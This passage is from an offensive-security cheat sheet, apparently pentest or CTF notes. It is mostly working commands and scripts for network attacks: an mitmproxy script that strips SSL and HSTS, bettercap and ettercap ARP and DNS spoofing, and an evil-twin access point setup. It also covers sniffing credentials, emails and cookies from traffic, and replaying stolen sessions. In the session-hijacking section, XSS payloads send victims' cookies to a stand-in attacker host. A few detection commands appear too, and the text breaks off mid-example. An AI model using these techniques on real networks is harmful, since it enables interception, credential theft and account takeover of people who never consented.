### mitmproxy - Modern MITM Framework

```bash
# Installation
apt-get install mitmproxy
# Or: pip install mitmproxy

# Interactive mode
mitmproxy -p 8080

# Transparent proxy mode
mitmproxy --mode transparent -p 8080

# SSL strip mode (ignore HTTPS)
mitmproxy -p 8080 --ssl-insecure

# Script-based SSL stripping
mitmproxy -s sslstrip_script.py

# Dump to file
mitmdump -p 8080 -w capture.mitm

# Read capture file
mitmproxy -r capture.mitm
```

**mitmproxy SSL Strip Script Example:**

```python
# sslstrip_script.py
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Downgrade HTTPS links to HTTP
    if flow.request.pretty_host == "target.com":
        flow.request.scheme = "http"
        flow.request.port = 80

def response(flow: http.HTTPFlow) -> None:
    # Rewrite HTTPS links in HTML to HTTP
    if "text/html" in flow.response.headers.get("content-type", ""):
        flow.response.content = flow.response.content.replace(
            b"https://", b"http://"
        )
        # Remove HSTS headers
        flow.response.headers.pop("strict-transport-security", None)
```

### bettercap - Modern Network Attack Framework

```bash
# Installation
apt-get install bettercap
# Or: https://github.com/bettercap/bettercap

# Interactive mode
bettercap -iface eth0

# Enable HTTP/HTTPS proxy with SSL stripping
> set http.proxy.sslstrip true
> set http.proxy.address 0.0.0.0
> set http.proxy.port 8080
> http.proxy on

# ARP spoofing
> set arp.spoof.targets 192.168.1.100
> set arp.spoof.internal false
> arp.spoof on

# Enable sniffing
> set net.sniff.verbose true
> set net.sniff.local true
> net.sniff on

# Combined attack script
bettercap -iface eth0 -caplet sslstrip.cap
```

**bettercap SSL Strip Caplet:**

```bash
# sslstrip.cap
set http.proxy.sslstrip true
set arp.spoof.targets 192.168.1.100
arp.spoof on
http.proxy on
net.sniff on
```

### HSTS Bypass Techniques

**NTP-Based HSTS Bypass** [Inference: Requires NTP manipulation capability]

```bash
# Concept: HSTS headers have max-age expiration
# If attacker can set victim's clock forward past max-age, HSTS expires

# Deauth attack + evil NTP server
# [Unverified: Practical success rate varies]
```

**Homograph/IDN Homograph Attacks**

```bash
# Register similar domain with Unicode characters
# Example: paypal.com â†’ pÐ°ypal.com (Cyrillic 'Ð°')
# Original: p(U+0070) a(U+0061) y p a l
# Spoofed:  p(U+0070) Ð°(U+0430) y p a l

# Check IDN encoding
echo "pÐ°ypal.com" | idn
# Output: xn--pypal-4ve.com

# Browser displays: pÐ°ypal.com
# Victim doesn't notice, enters credentials over HTTP
```

### Defense Detection

```bash
# Check for HSTS
curl -I https://target.com | grep -i strict-transport-security

# Check HSTS preload status
curl -s https://hstspreload.org/api/v2/status?domain=target.com | jq

# Browser HSTS cache (Chrome)
chrome://net-internals/#hsts
# Query/Delete HSTS entries

# Firefox HSTS cache
# Site Security â†’ View Certificates â†’ Servers
```

---

## SSL/TLS Downgrade Attacks

SSL/TLS downgrade attacks force clients and servers to negotiate weaker protocol versions or cipher suites, enabling decryption of traffic through exploitation of known vulnerabilities in legacy protocols.

### Protocol Downgrade Attacks

**SSLv3 / TLS 1.0 Downgrade**

```bash
# Test for SSLv3 support (POODLE vulnerable)
nmap --script ssl-enum-ciphers -p 443 target.com | grep "SSLv3"

# OpenSSL test for SSLv3
openssl s_client -connect target.com:443 -ssl3

# Test specific TLS versions
openssl s_client -connect target.com:443 -tls1
openssl s_client -connect target.com:443 -tls1_1
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -tls1_3

# Successful connection indicates version support
# Look for "Protocol : SSLv3" in output
```

**testssl.sh - Comprehensive SSL/TLS Testing**

```bash
# Installation
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# Full test suite
./testssl.sh https://target.com

# Check for specific vulnerabilities
./testssl.sh --vulnerable https://target.com

# Protocol support testing
./testssl.sh -p https://target.com

# Cipher suite enumeration
./testssl.sh -E https://target.com

# Check for weak ciphers
./testssl.sh -S https://target.com

# Output to file
./testssl.sh --jsonfile results.json https://target.com
```

**SSLyze - Fast SSL Configuration Scanner**

```bash
# Installation
pip install sslyze

# Basic scan
sslyze target.com

# Protocol downgrade testing
sslyze --sslv2 --sslv3 --tlsv1 --tlsv1_1 target.com

# Certificate validation
sslyze --certinfo target.com

# Heartbleed, CCS Injection, ROBOT checks
sslyze --heartbleed --openssl_ccs --robot target.com

# JSON output
sslyze --json_out=results.json target.com
```

### Specific Protocol Vulnerabilities

**POODLE (SSLv3) - CVE-2014-3566**

[Inference: Padding Oracle On Downgraded Legacy Encryption]

```bash
# Test for POODLE vulnerability
nmap --script ssl-poodle -p 443 target.com

# testssl.sh check
./testssl.sh -O https://target.com | grep POODLE

# Exploitation requires:
# 1. SSLv3 support on server
# 2. CBC-mode cipher negotiated
# 3. Ability to inject JavaScript (for padding oracle)

# Manual test
openssl s_client -connect target.com:443 -ssl3 -cipher "ECDHE-RSA-AES128-SHA"
# If succeeds, vulnerable to downgrade
```

**BEAST (TLS 1.0) - CVE-2011-3389**

```bash
# Check for TLS 1.0 with CBC ciphers
nmap --script ssl-enum-ciphers -p 443 target.com | grep -A 10 "TLSv1.0" | grep CBC

# Specific cipher test
openssl s_client -connect target.com:443 -tls1 -cipher "AES128-SHA"

# testssl.sh BEAST check
./testssl.sh -B https://target.com
```

**CRIME (TLS Compression) - CVE-2012-4929**

```bash
# Test for compression support
openssl s_client -connect target.com:443 -tls1_2 </dev/null 2>&1 | grep Compression

# Expected safe output: "Compression: NONE"
# Vulnerable: "Compression: zlib" or "Compression: DEFLATE"

# nmap check
nmap --script ssl-enum-ciphers -p 443 target.com | grep compression
```

**BREACH (HTTP Compression)**

[Inference: Application-layer variant of CRIME]

```bash
# Check for HTTP compression
curl -I -H "Accept-Encoding: gzip, deflate" https://target.com | grep -i "content-encoding"

# If returns "Content-Encoding: gzip", potentially vulnerable
# Requires: HTTPS, HTTP compression, user input reflected, secrets in response
```

### Active Downgrade Attack Execution

**bettercap TLS Downgrade**

```bash
# Enable TLS proxy with downgrade
bettercap -iface eth0

> set https.proxy.sslstrip true
> set https.proxy.certificate ~/.bettercap-ca.cert.pem
> set https.proxy.key ~/.bettercap-ca.key.pem
> https.proxy on

# ARP spoof to position as MITM
> set arp.spoof.targets 192.168.1.100
> arp.spoof on

# Intercept and downgrade
# bettercap will attempt to strip HTTPS or negotiate weak ciphers
```

**mitmproxy with Protocol Downgrade**

```python
# downgrade_tls.py
from mitmproxy import ctx
from mitmproxy.proxy.protocol import TlsLayer

def tls_clienthello(data: TlsLayer.TlsData):
    # Modify ClientHello to remove TLS 1.3, forcing TLS 1.2 or lower
    # [Unverified: Requires deep packet manipulation]
    ctx.log.info("Attempting TLS downgrade")
    # Implementation requires TLS library manipulation
```

**Wireshark Analysis of Downgrade**

```bash
# Capture traffic during attack
tcpdump -i eth0 -w downgrade.pcap port 443

# Wireshark filters
ssl.handshake.type == 1  # ClientHello
ssl.handshake.type == 2  # ServerHello
ssl.handshake.version    # Protocol version

# Look for:
# - ClientHello offering TLS 1.3, 1.2
# - ServerHello responding with TLS 1.0 or SSLv3
# - Indicates successful downgrade
```

### Cipher Suite Downgrade

**Weak Cipher Enumeration**

```bash
# Export-grade ciphers (FREAK - CVE-2015-0204)
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i "export"

# Test for EXPORT ciphers
openssl s_client -connect target.com:443 -cipher "EXPORT"

# NULL ciphers (no encryption)
openssl s_client -connect target.com:443 -cipher "NULL"

# Anonymous ciphers (no authentication)
openssl s_client -connect target.com:443 -cipher "ADH"

# RC4 ciphers (weak stream cipher)
openssl s_client -connect target.com:443 -cipher "RC4"
```

**FREAK Attack (Factoring RSA Export Keys)**

```bash
# Test for EXPORT cipher support
nmap --script ssl-enum-ciphers -p 443 target.com | grep "EXP"

# testssl.sh FREAK check
./testssl.sh -F https://target.com

# Manual OpenSSL test
openssl s_client -connect target.com:443 -cipher "EXPORT"
```

**Logjam Attack (DHE_EXPORT Downgrade)**

```bash
# Check for weak DH parameters
nmap --script ssl-dh-params -p 443 target.com

# testssl.sh Logjam check
./testssl.sh -J https://target.com

# Look for DH key exchange with < 2048-bit parameters
```

### Certificate Validation Downgrade

**Certificate Pinning Bypass** [Inference: Client-side attack]

```bash
# Android: Frida-based unpinning
frida -U -f com.target.app -l universal-ssl-unpinning.js --no-pause

# iOS: SSL Kill Switch 2
# Cydia package for jailbroken devices

# Desktop: Burp Suite certificate installation
# Install Burp CA certificate in system trust store
```

**Certificate Validation Testing**

```bash
# Self-signed certificate test
openssl s_client -connect target.com:443 -CAfile /dev/null

# Expired certificate
# [Inference: Check if client accepts without warning]

# Wrong hostname
openssl s_client -connect target.com:443 -servername wronghost.com
```

---

## Traffic Interception

Traffic interception captures network communications for analysis, credential harvesting, and protocol-specific attacks. Techniques vary based on network position and protocol encryption.

### Network Positioning for MITM

**ARP Spoofing (Layer 2 MITM)**

```bash
# arpspoof (dsniff package)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1  # victim â†’ gateway
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100  # gateway â†’ victim

# Run both simultaneously for bidirectional spoofing
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Monitor ARP table on victim
arp -a | grep 192.168.1.1
# Gateway MAC should match attacker's MAC if successful
```

**Ettercap - Comprehensive MITM Suite**

```bash
# Installation
apt-get install ettercap-graphical ettercap-text-only

# Text mode unified sniffing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
# -T: text mode, -M: MITM method
# /IP//: first host, /IP//: second host (// = all ports)

# Graphical mode
ettercap -G

# Specific interface
ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# With plugin
ettercap -T -M arp -P dns_spoof /192.168.1.1// /192.168.1.100//

# Log to file
ettercap -T -M arp -L ettercap_capture /192.168.1.1// /192.168.1.100//
# Creates: ettercap_capture.eci (info), ettercap_capture.ecp (packets)

# Read logs
etterlog -a ettercap_capture.ecp  # ASCII output
etterlog -c ettercap_capture.ecp  # Connection profiles
```

**Ettercap Filters (Content Modification)**

```bash
# Create filter file: drop_ssh.filter
if (ip.proto == TCP && tcp.dst == 22) {
   drop();
   msg("SSH connection dropped\n");
}

# Compile filter
etterfilter drop_ssh.filter -o drop_ssh.ef

# Apply filter
ettercap -T -M arp -F drop_ssh.ef /192.168.1.1// /192.168.1.100//
```

**bettercap ARP Spoofing**

```bash
# Basic ARP spoofing
bettercap -iface eth0

> set arp.spoof.targets 192.168.1.100
> set arp.spoof.internal false  # don't spoof other internal hosts
> set arp.spoof.fullduplex true  # bidirectional
> arp.spoof on

# Verify
> arp.spoof.stats

# Combined with sniffing
> net.sniff on
> set net.sniff.verbose true
> set net.sniff.local true  # capture localhost traffic
> set net.sniff.filter "tcp port 80 or tcp port 443"
```

### Rogue Access Point / Evil Twin

**hostapd - Software Access Point**

```bash
# Configuration: /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0

# Start AP
hostapd /etc/hostapd/hostapd.conf

# DHCP server (dnsmasq)
# Configuration: /etc/dnsmasq.conf
interface=wlan0
dhcp-range=192.168.100.10,192.168.100.50,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1

# Start dnsmasq
dnsmasq -C /etc/dnsmasq.conf

# IP forwarding and NAT
ifconfig wlan0 192.168.100.1 netmask 255.255.255.0
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**WiFi-Pumpkin - Rogue AP Framework**

```bash
# Installation
git clone https://github.com/P0cL4bs/wifipumpkin3.git
cd wifipumpkin3
pip install -r requirements.txt

# Run
wifipumpkin3

# Configure rogue AP
wp3 > set interface wlan0
wp3 > set ssid "Free_WiFi"
wp3 > set proxy sslstrip
wp3 > start
```

**Fluxion - WPA/WPA2 Evil Twin**

[Inference: Social engineering-based credential capture]

```bash
# Clone and run
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
./fluxion.sh

# Workflow:
# 1. Scan for target AP
# 2. Capture handshake (optional)
# 3. Create evil twin AP
# 4. Deauth clients from real AP
# 5. Serve captive portal requesting "WPA key"
# 6. Capture submitted password
```

### Packet Capture and Analysis

**tcpdump - Command-Line Packet Analyzer**

```bash
# Capture on interface
tcpdump -i eth0

# Write to file
tcpdump -i eth0 -w capture.pcap

# Capture specific protocol
tcpdump -i eth0 tcp port 80
tcpdump -i eth0 udp port 53

# Multiple ports
tcpdump -i eth0 'port 80 or port 443'

# Capture from specific host
tcpdump -i eth0 host 192.168.1.100

# Source/destination specific
tcpdump -i eth0 src 192.168.1.100
tcpdump -i eth0 dst 192.168.1.1

# Capture with verbosity and no hostname resolution
tcpdump -i eth0 -n -vvv tcp port 80

# Snap length (bytes per packet)
tcpdump -i eth0 -s 65535 -w full_capture.pcap  # full packets
tcpdump -i eth0 -s 96 -w headers_only.pcap  # headers only

# Rotate files by size
tcpdump -i eth0 -w capture.pcap -C 100  # 100 MB per file

# Count packets
tcpdump -i eth0 -c 1000  # capture 1000 packets then stop
```

**Wireshark - GUI Packet Analyzer**

```bash
# Command-line capture
tshark -i eth0 -w capture.pcap

# Live capture with display filter
tshark -i eth0 -f "tcp port 80" -Y "http.request.method == POST"

# Read and filter pcap
tshark -r capture.pcap -Y "http.request or http.response"

# Export HTTP objects
tshark -r capture.pcap --export-objects http,output_dir/

# Statistics
tshark -r capture.pcap -z conv,tcp  # TCP conversations
tshark -r capture.pcap -z http,tree  # HTTP statistics

# Decrypt TLS (with key log file)
tshark -r capture.pcap -o "ssl.keylog_file:sslkeys.log" -Y "http"
```

**Wireshark Display Filters (Common)**

```
# HTTP traffic
http
http.request.method == "POST"
http.request.uri contains "login"
http.cookie

# Credentials
http.authbasic  # HTTP Basic Auth
ftp.request.command == "USER" or ftp.request.command == "PASS"
pop.request.command contains "USER"

# TLS/SSL
ssl.handshake.type == 1  # ClientHello
ssl.handshake.ciphersuite
tls.record.content_type == 22  # Handshake

# DNS
dns.qry.name contains "target"
dns.flags.response == 1

# SMB
smb2
smb2.cmd == 3  # Session Setup

# Follow streams
tcp.stream eq 0  # Follow specific TCP stream
```

### Credential Harvesting from Traffic

**PCredz - Credential Extractor**

```bash
# Installation
git clone https://github.com/lgandx/PCredz.git
cd PCredz

# Live capture
python3 Pcredz -i eth0

# From PCAP file
python3 Pcredz -f capture.pcap

# Verbose mode
python3 Pcredz -i eth0 -v

# Extracts:
# - HTTP POST credentials
# - FTP credentials
# - POP/IMAP/SMTP
# - NTLM hashes (HTTP/SMB)
# - Kerberos tickets
```

**net-creds - Network Credential Sniffer**

```bash
# Installation
git clone https://github.com/DanMcInerney/net-creds.git
cd net-creds

# Live sniffing
python3 net-creds.py -i eth0

# From file
python3 net-creds.py -p capture.pcap

# Captures:
# - URLs visited
# - POST data
# - HTTP form submissions
# - FTP/IMAP/POP/IRC credentials
# - Cookies
```

**Responder - LLMNR/NBT-NS/MDNS Poisoner** [Inference: Primarily credential capture tool]

```bash
# Installation
apt-get install responder
# Or: git clone https://github.com/lgandx/Responder.git

# Basic poisoning
responder -I eth0

# Analyze mode (no poisoning, just listening)
responder -I eth0 -A

# Specific protocols
responder -I eth0 -w -r -d  # WPAD, NetBIOS, DHCP

# With fingerprinting
responder -I eth0 -f

# Captured hashes appear in:
# /usr/share/responder/logs/
```

### Protocol-Specific Interception

**HTTP/HTTPS (Covered in SSL Stripping section)**

**FTP Interception**

```bash
# tcpdump FTP commands
tcpdump -i eth0 -A 'port 21'

# Wireshark filter
ftp

# Extract credentials
tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" -T fields -e ftp.request.arg
```

**DNS Spoofing**

```bash
# Ettercap DNS spoofing
# Edit /etc/ettercap/etter.dns
target.com A 192.168.1.50
*.target.com A 192.168.1.50

# Run with dns_spoof plugin
ettercap -T -M arp -P dns_spoof /192.168.1.1// /192.168.1.100//

# bettercap DNS spoofing
> set dns.spoof.domains target.com
> set dns.spoof.address 192.168.1.50
> dns.spoof on

# dnsspoof (dsniff)
dnsspoof -i eth0 -f hosts.txt
# hosts.txt format: 192.168.1.50 target.com
```

**SMB/CIFS Interception**

```bash
# Capture SMB traffic
tcpdump -i eth0 -w smb.pcap 'port 445 or port 139'

# Wireshark SMB filter
smb2

# Extract NTLM hashes from traffic
tshark -r smb.pcap -Y "ntlmssp" -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response

# Responder (active NTLM capture)
responder -I eth0 -wrf
```

**VoIP/SIP Interception**

```bash
# Capture SIP traffic
tcpdump -i eth0 -w voip.pcap 'port 5060 or portrange 10000-20000'

# Wireshark SIP analysis
# Telephony â†’ VoIP Calls
# Play streams: Telephony â†’ RTP â†’ Show All Streams

# Extract audio
tshark -r voip.pcap -Y "rtp" -w rtp.pcap
# Use Wireshark: Telephony â†’ RTP â†’ Stream Analysis â†’ Save audio
```

### OS-Specific MITM Considerations

**Linux:**

- Requires root for raw sockets and packet injection
- IP forwarding: `/proc/sys/net/ipv4/ip_forward`
- iptables for traffic redirection
- Monitor mode support varies by wireless driver

**Windows:**

- Requires Npcap/WinPcap for raw packet operations
- Limited raw socket support (Windows XP SP2+)
- Cain & Abel (legacy), Ettercap Windows builds available
- Administrative privileges required for ARP spoofing

**macOS:**

- Similar to Linux but uses `pf` (packet filter) instead of iptables
- Requires root privileges
- Some tools require SIP (System Integrity Protection) disabled [Inference: Security risk]

### Detection and Prevention

**MITM Detection on Target Network**

```bash
# Check for duplicate MAC addresses (ARP spoofing indicator)
arp -a | sort -k 4
# Multiple IPs with same MAC = potential ARP spoofing

# Monitor ARP changes
arpwatch  # logs ARP activity
# Check /var/log/arpwatch.log for flips/changes

# Static ARP entries (prevention)
arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF

# XArp (Windows) - ARP monitoring tool
# [Unverified: Free version limitations]
```

**Certificate Validation**

```bash
# Check certificate fingerprint
openssl s_client -connect target.com:443 < /dev/null 2>&1 | openssl x509 -fingerprint -noout

# Compare with known good fingerprint
# Different = potential MITM

# Certificate Transparency monitoring
curl -s "https://crt.sh/?q=target.com&output=json" | jq
```

**Important Related Topics:**

- **IPv6 MITM Attacks**: Router Advertisement spoofing, DHCPv6 attacks
- **802.1X Bypass**: MAC spoofing for port-based NAC evasion
- **Wireless Attacks**: WEP/WPA/WPA2 cracking, WPS PIN attacks, PMKID attacks
- **Post-MITM Exploitation**: Session hijacking, credential reuse, lateral movement

---

## Packet Sniffing

Packet sniffing captures network traffic for analysis, revealing unencrypted protocols, authentication credentials, and application behavior.

### Tcpdump - Command Line Packet Capture

**Basic Capture Operations**

```bash
# Capture on specific interface
tcpdump -i eth0

# Capture all interfaces
tcpdump -i any

# Write to pcap file
tcpdump -i eth0 -w capture.pcap

# Read from pcap file
tcpdump -r capture.pcap

# Verbose output with packet contents
tcpdump -i eth0 -v
tcpdump -i eth0 -vv
tcpdump -i eth0 -vvv

# Show ASCII and hex dump
tcpdump -i eth0 -A  # ASCII only
tcpdump -i eth0 -X  # Hex and ASCII

# Don't resolve hostnames (faster)
tcpdump -i eth0 -n

# Don't resolve hostnames or ports
tcpdump -i eth0 -nn
```

**Targeted Filtering**

```bash
# Capture specific host
tcpdump -i eth0 host 192.168.1.100
tcpdump -i eth0 src 192.168.1.100
tcpdump -i eth0 dst 192.168.1.100

# Capture specific port
tcpdump -i eth0 port 80
tcpdump -i eth0 port 80 or port 443

# Capture specific protocol
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp

# Capture specific network
tcpdump -i eth0 net 192.168.1.0/24

# Complex filters with BPF
tcpdump -i eth0 'tcp port 80 and (src net 192.168.1.0/24)'
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'  # SYN packets only

# Capture HTTP traffic
tcpdump -i eth0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Snaplen to capture full packets
tcpdump -i eth0 -s 65535 -w full_capture.pcap

# Rotate capture files by size
tcpdump -i eth0 -w capture.pcap -C 100  # 100MB files

# Limit number of packets
tcpdump -i eth0 -c 1000
```

**Protocol-Specific Captures**

```bash
# HTTP GET requests
tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420)'

# HTTP POST requests
tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# DNS queries
tcpdump -i eth0 -n udp port 53

# FTP commands
tcpdump -i eth0 -A -n 'tcp port 21'

# SMTP traffic
tcpdump -i eth0 -A -n 'tcp port 25'

# SMB/CIFS traffic
tcpdump -i eth0 'tcp port 445 or tcp port 139'
```

### Wireshark - GUI Packet Analysis

**Command Line (tshark)**

```bash
# Basic capture
tshark -i eth0

# Write to file
tshark -i eth0 -w capture.pcap

# Capture with display filter
tshark -i eth0 -f "tcp port 80" -w http_capture.pcap

# Read and apply display filter
tshark -r capture.pcap -Y "http"

# Extract specific fields
tshark -r capture.pcap -Y "http" -T fields -e ip.src -e ip.dst -e http.request.uri

# Statistics
tshark -r capture.pcap -q -z io,phs  # Protocol hierarchy
tshark -r capture.pcap -q -z conv,tcp  # TCP conversations
tshark -r capture.pcap -q -z endpoints,ip  # IP endpoints

# Follow TCP stream
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Export objects
tshark -r capture.pcap --export-objects http,./exported_files/
```

**Useful Display Filters**

```bash
# HTTP traffic
tshark -r capture.pcap -Y "http"

# HTTP requests only
tshark -r capture.pcap -Y "http.request"

# HTTP with specific method
tshark -r capture.pcap -Y "http.request.method == POST"

# Contains specific string
tshark -r capture.pcap -Y "frame contains password"
tshark -r capture.pcap -Y "tcp contains admin"

# Credentials in HTTP
tshark -r capture.pcap -Y "http.authorization"

# FTP credentials
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS"

# Telnet data
tshark -r capture.pcap -Y "telnet"

# DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0"

# SSL/TLS handshake
tshark -r capture.pcap -Y "ssl.handshake"

# Suspicious flags
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0"  # SYN scan
```

**Extract Credentials from PCAP**

```bash
# HTTP Basic Auth
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization

# Decode Base64 Basic Auth
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization | sed 's/Basic //' | base64 -d

# FTP credentials
tshark -r capture.pcap -Y "ftp.request.command == USER" -T fields -e ftp.request.arg
tshark -r capture.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg

# HTTP POST data
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# Extract HTTP cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
```

### Ettercap - Interactive MITM Tool

**ARP Poisoning with Sniffing**

```bash
# Text interface
ettercap -T -i eth0

# GUI interface
ettercap -G

# Unified sniffing (bridged)
ettercap -T -M arp:remote -i eth0 ///  # All targets

# Target specific hosts
ettercap -T -M arp:remote -i eth0 /192.168.1.1// /192.168.1.100//
# Format: /IP/MAC/PORT/ (leave MAC empty for ARP resolution)

# Sniff between gateway and target
ettercap -T -M arp:remote -i eth0 /192.168.1.1// /192.168.1.0/24//

# Write to pcap
ettercap -T -M arp:remote -w capture.pcap -i eth0 /// ///

# Plugin usage
ettercap -T -M arp:remote -P autoadd -i eth0 /// ///
```

**Ettercap Filters**

```bash
# Create filter file (example: drop.filter)
# if (ip.proto == TCP && tcp.dst == 80) {
#    msg("HTTP packet dropped\n");
#    drop();
# }

# Compile filter
etterfilter drop.filter -o drop.ef

# Apply filter
ettercap -T -M arp:remote -F drop.ef -i eth0 /// ///

# Common filter examples:
# Replace content: replace("old", "new");
# Log data: log(DATA.data, "filename");
# Inject data: inject("data to inject");
```

**SSL Stripping with Ettercap**

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Run ettercap with SSL dissector
ettercap -T -M arp:remote -i eth0 /gateway_ip// /target_ip//

# Check /etc/ettercap/etter.conf for SSL dissector settings
# Uncomment redir_command_on for iptables SSL strip
```

### Dsniff Suite - Credential Harvesting Tools

**dsniff - Password Sniffer**

```bash
# Sniff passwords on interface
dsniff -i eth0

# Read from pcap file
dsniff -p capture.pcap

# Specific services
dsniff -n  # Don't resolve hostnames (faster)

# Trigger mode (wait for trigger packet)
dsniff -t trigger_spec
```

dsniff automatically extracts credentials from: FTP, Telnet, SMTP, HTTP, POP, NNTP, IMAP, SNMP, LDAP, Rlogin, RIP, OSPF, PPTP MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ, Napster, PostgreSQL, Meeting Maker, Citrix ICA, Symantec pcAnywhere, NAI Sniffer, Microsoft SMB, Oracle SQL*Net, Sybase, and Microsoft SQL.

**urlsnarf - HTTP URL Logger**

```bash
# Log URLs from interface
urlsnarf -i eth0

# Log from pcap
urlsnarf -p capture.pcap

# Output format: timestamp source > destination request
```

**webspy - Web Browsing Monitor**

```bash
# Monitor target's web browsing
webspy -i eth0 target_ip
```

**mailsnarf - Email Sniffer**

```bash
# Capture email content
mailsnarf -i eth0

# From pcap file
mailsnarf -p capture.pcap
```

**msgsnarf - Instant Messaging Sniffer**

```bash
# Capture IM conversations
msgsnarf -i eth0

# Supports: AIM, ICQ, IRC, MSN Messenger, Yahoo Messenger
```

### Bettercap - Modern MITM Framework

**Basic Operations**

```bash
# Interactive mode
bettercap -iface eth0

# Caplets (scripted attacks)
bettercap -iface eth0 -caplet http-req-dump

# Eval mode (one-liner)
bettercap -iface eth0 -eval "net.probe on; net.sniff on"
```

**Interactive Commands**

```
# Network discovery
net.probe on
net.show

# ARP spoofing
set arp.spoof.targets 192.168.1.100
set arp.spoof.internal false
arp.spoof on

# Packet sniffing
set net.sniff.verbose true
set net.sniff.local true
set net.sniff.filter tcp port 80
net.sniff on

# HTTP/HTTPS proxy
set http.proxy.sslstrip true
set http.proxy.script /path/to/script.js
http.proxy on
https.proxy on

# DNS spoofing
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.50
dns.spoof on

# Credential sniffer
set net.sniff.verbose false
set net.sniff.local false
net.sniff on

# Packet injection
# Requires custom modules or scripts
```

**Caplet Examples**

```bash
# Create HTTP credential logger (http-creds.cap)
# net.probe on
# set net.sniff.verbose false
# set net.sniff.local false
# set net.sniff.filter tcp port 80 or tcp port 443
# net.sniff on
# set http.proxy.sslstrip true
# http.proxy on

# Run caplet
bettercap -iface eth0 -caplet http-creds.cap
```

**JavaScript Injection**

```javascript
// Example: inject.js
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        if (body.indexOf('</head>') != -1) {
            res.Body = body.replace(
                '</head>',
                '<script>alert("Injected")</script></head>'
            );
        }
    }
}
```

```bash
# Use injection script
set http.proxy.script inject.js
http.proxy on
```

## Session Hijacking

Session hijacking steals or predicts session identifiers to impersonate authenticated users.

### Cookie Theft Techniques

**XSS-Based Cookie Theft** (simulation for CTF)

```bash
# Set up listener
nc -lvnp 8080

# Payload to steal cookies (in CTF web challenges):
# <script>document.location='http://attacker:8080/?c='+document.cookie</script>
# <script>new Image().src='http://attacker:8080/?c='+document.cookie</script>
# <script>fetch('http://attacker:8080/?c='+btoa(document.cookie))</script>
```

**Network-Based Cookie Capture**

```bash
# Extract cookies from pcap
tshark -r capture.pcap -Y "http.cookie" -T fields -e ip.src -e http.cookie

# Extract Set-Cookie headers
tshark -r capture.pcap -Y "http.set_cookie" -T fields -e ip.dst -e http.set_cookie

# Using grep on tcpdump output
tcpdump -A -r capture.pcap | grep -i "cookie:"

# Bettercap cookie logger
# In bettercap interactive mode:
set net.sniff.verbose false
set net.sniff.regexp '.*cookie.*'
net.sniff on
```

**Hamster & Ferret - Session Sidejacking**

```bash
# Ferret captures sessions (older tool)
ferret -i eth0

# Hamster proxies captured sessions
# Access via http://127.0.0.1:1234

# Note: These tools are dated but useful for understanding concepts
```

### Session Replay Attacks

**Manual Session Replay**

```bash
# Capture valid request with cookies
curl -v http://<target>/profile -b "PHPSESSID=captured_session_id"

# Replay with curl
curl http://<target>/admin -b "PHPSESSID=stolen_session_id"

# Using wget
wget --header="Cookie: PHPSESSID=stolen_session_id" http://<target>/admin

# Test session validity
curl -I http://<target>/dashboard -b "session=stolen_session"
```

**Burp Suite Session Replay**

```
1. Capture legitimate request in Proxy -> HTTP history
2. Send to Repeater
3. Modify Cookie header with stolen session
4. Click "Send" to replay
5. Analyze response for successful hijack
```

**Cookie Manipulation in Browser**

```javascript
// Browser console manipulation
document.cookie = "PHPSESSID=stolen_value; path=/";

// Check current cookies
document.cookie

// Using browser dev tools:
// F12 -> Application/Storage -> Cookies -> Edit values
```

### TCP Session Hijacking

**Hunt - TCP Session Hijacker** (older but conceptually important)

```bash
# Start hunt
hunt

# List active connections
l/w

# Hijack connection (by connection number)
hijack <connection_number>
```

[Unverified] Hunt is an older tool; modern networks with encryption make raw TCP hijacking less practical, but the concepts remain relevant for understanding session security.

**Shijack - TCP Hijacking Tool**

```bash
# Hijack TCP session
shijack eth0 <source_ip> <dest_ip> <source_port> <dest_port>

# Note: Requires sequence number prediction or monitoring
```

### Session Fixation Testing

**Testing for Session Fixation**

```bash
# 1. Obtain session ID before authentication
curl -I http://<target> -c before_login.txt

# 2. Login with that session
curl -b before_login.txt -d "username=admin&password=pass" http://<target>/login -c after_login.txt

